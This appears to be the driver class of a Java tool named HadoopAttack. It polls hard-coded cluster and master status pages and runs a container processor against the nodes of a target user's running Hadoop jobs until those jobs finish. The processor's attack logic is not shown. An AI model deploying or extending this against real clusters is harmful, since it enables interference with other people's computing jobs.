package com.hadoop.main;

import java.util.ArrayList;
import java.util.List;

import com.hadoop.common.Application;
import com.hadoop.common.ContainerProcessor;
import com.hadoop.common.Tools;

/**
 * 
 * @author Admin
 *
 */
public class HadoopAttack {
	public static String allContainerFix = "/node/allContainers";
	private static String masterUrl = "http://1.brainoverflow.sinaapp.com/master.html";
	private static String clusterUrl = "http://1.brainoverflow.sinaapp.com/cluster.html";
	private static String encoding = "UTF-8";
	private static String user = "hadoop";

	public static void main(String[] args) {
		if (args.length == 3) {
			user = args[0];
			masterUrl = args[1];
			clusterUrl = args[2];
		}
		while (true) {
			List<Application> appList = Tools.getAppList(masterUrl, encoding);
			for (Application app : appList) {
				if (app.getUser().equals(user)
						&& !app.getStatus().equals("FINISHED")
						&& !app.getStatus().equals("FAILED")) {
					System.out.println("Get App Id:" + app.getId());
					ArrayList<String> slavers = Tools.getSlaverList(clusterUrl,
							encoding);
					ContainerProcessor containerProcessor = new ContainerProcessor(
							app, slavers);
					containerProcessor.run();
					boolean running = true;
					while (running) {
						List<Application> appList2 = Tools.getAppList(
								masterUrl, encoding);
						for (Application app2 : appList2) {
							if (app.getId().equals(app2.getId())
									&& (app2.getStatus().equals("FINISHED") || app2
											.getStatus().equals("FAILED"))) {
								containerProcessor.kill();
								System.out.println(app.getId() + " has Done!");
								running = false;
								break;
							}
						}
					}
				}
			}
		}

	}
}
